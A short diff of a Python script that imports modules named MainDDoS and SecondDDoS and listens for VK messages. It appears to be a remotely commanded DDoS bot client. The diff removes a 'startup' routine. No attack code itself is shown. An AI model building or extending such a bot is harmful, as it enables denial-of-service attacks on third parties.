@@ -1,6 +1,5 @@
 from MainDDoS import mainDDoS
 from SecondDDoS import secondDDoS
-from Startup import startup
 from vk_api import VkApi
 from vk_api.utils import get_random_id
 from vk_api.longpoll import VkLongPoll, VkEventType
@@ -21,7 +20,6 @@ def message(message):
 
 
 
-startup()
 name = getuser()
 
 for event in longpoll.listen():
